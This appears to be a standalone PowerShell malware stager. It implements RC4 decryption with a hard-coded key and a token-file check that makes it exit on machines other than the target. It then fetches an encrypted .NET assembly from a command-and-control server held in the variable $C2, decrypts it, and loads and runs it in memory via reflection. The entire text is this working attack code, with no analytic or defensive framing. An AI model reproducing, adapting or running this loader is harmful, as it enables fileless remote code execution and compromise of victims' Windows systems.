$E = [System.Text.Encoding]::ASCII
$K = $E.GetBytes('zHsqz5LbhQuqcWQmJvRW')
$R = {
    $D,$K=$Args
    $i=0
    $S=0..255
    0..255|%{
        $J=($J+$S[$_]+$K[$_%$K.Length])%256
        $S[$_],$S[$J]=$S[$J],$S[$_]
    }

    $D|%{
        $I=($I+1)%256
        $H=($H+$S[$I])%256
        $S[$I],$S[$H]=$S[$H],$S[$I]
        $_-bxor$S[($S[$I]+$S[$H])%256]
    }
}

if ((compare-object (& $R $E.GetBytes((Get-Content "C:\\Users\\Public\\Documents\\token.txt")) $K) ([System.Convert]::FromBase64String("FxxGrgbb/w==")))){Exit}
[System.Reflection.Assembly]::Load([byte[]](& $R (Invoke-WebRequest "http://$C2/O4vg7tmRa8fOCYGQH9U5" -UseBasicParsing).Content $K)).GetType('E.C').GetMethod('SC', [Reflection.BindingFlags] 'Static, Public, NonPublic').Invoke($null, [object[]]@($C2))
